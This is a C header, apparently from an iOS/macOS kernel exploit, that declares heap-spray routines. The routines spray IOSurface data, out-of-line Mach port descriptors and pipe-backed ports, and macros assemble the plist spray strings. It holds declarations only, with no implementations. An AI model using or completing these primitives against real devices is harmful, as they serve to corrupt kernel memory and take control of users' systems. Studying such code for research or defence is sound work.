#ifndef SPRAY_H
#define SPRAY_H

#include <Foundation/Foundation.h>
#include "iokit.h"

#define CREATE_SPRAY_DATA(X, Y)			\
    sprintf(X, "%s%s%s",			\
	    "<data>",		\
	    Y,  				\
	    "</data>\n");

#define BEGIN_SPRAY_STRING(X) \
    sprintf(X, "%s%s",	      \
	    "<array>\n",      \
	    "<array>\n");

#define APPEND_SPRAY_STRING_END(X, Y)		\
    strcat(X, "</array>\n");	   \
    strcat(X, "<string>");	   \
    strcat(X, Y);		   \
    strcat(X, "</string>\n");	   \
    strcat(X, "</array>\n");

int io_surface_spray(io_connect_t *connection, uint32_t *surface_id,
		     size_t size, char *key, void *data, size_t data_size);
int ool_ports_descriptor_spray(mach_port_t *receive_port, size_t n_ool_ports_descriptor_messages,
					 size_t count, mach_port_t *data);
int ool_descriptor_spray(mach_port_t *spray_port, uint8_t *data, size_t data_size);
void pipe_port_spray(int read_fd, int write_fd, uint64_t offset, mach_port_t *port_to_destroy);

#endif // SPRAY_H
